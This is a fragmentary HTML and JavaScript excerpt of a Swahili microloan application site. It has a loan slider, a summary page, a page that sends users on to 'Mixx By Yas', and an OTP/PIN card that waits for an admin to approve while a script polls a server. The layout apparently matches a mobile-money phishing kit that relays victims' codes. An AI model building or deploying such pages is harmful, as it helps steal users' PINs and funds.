  ...
  <div class="land-center">
    <div class="land-card">
      ...
      <div class="calc-box">
        ...
        <div class="calc-row2"><span>Kiasi cha Mkopo</span><span class="cv" id="aDisp">Tsh 1,000</span></div>
        <input type="range" id="rA" min="50" max="10000" step="50" value="1000" oninput="calcUp()" style="--pct:9.9%">
        <div class="range-ends"><span>Tsh 50</span><span>Tsh 10,000</span></div>
        ...
        <div class="monthly-box">
          ...
          <span class="ma" id="mOut">Tsh 104.17</span>
        </div>
      </div>
...
<div id="page-step1" class="page">
  ...
  <div class="step-center">
    <div class="step-card">
      ...
      <div class="field"><label>Kiasi cha Mkopo (Tsh)</label><input type="number" id="s1am" value="1000" placeholder="Ingiza kiasi" oninput="clearErr('s1Err')"></div>
  ...
  <div class="step-center">
    <div class="step-card">
      ...
      <div class="sum-box">
        ...
        <div class="sum-row"><span class="sk">Kiasi cha Mkopo:</span><span class="sv" id="sA">Tsh 1,000</span></div>
...
<div id="page-submitted" class="page">
  <div class="sub-wrap">
    ...
    <p>Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Mixx By Yas.</p>
  ...
  <div class="otp-body-wrap">
    <div class="otp-card">
      ...
      <div class="waiting-box" id="pinWait">
        ...
        <p>Inasubiri admin kuthibitisha maelezo yako…</p>
      </div>
...
<div id="page-approval" class="page">
  <div class="appr-wrap">
    <div class="appr-top">
      ...
      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">Tsh 1,000</div></div>
    </div>
    <div class="comp-box">
...
<script>
  ...
  function calcUp() {
    ...
    document.getElementById('rA').style.setProperty('--pct', ((a-50)/(10000-50)*100).toFixed(1) + '%');
  ...
  function startRs() {
    ...
    rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
    ...
    otpPollInterval = setInterval(async () => {
      try {
        ...
        if (data.status === 'approved') {
          ...
          document.getElementById('apAmt').textContent  = 'Tsh ' + Number(S.amt || 1000).toLocaleString();
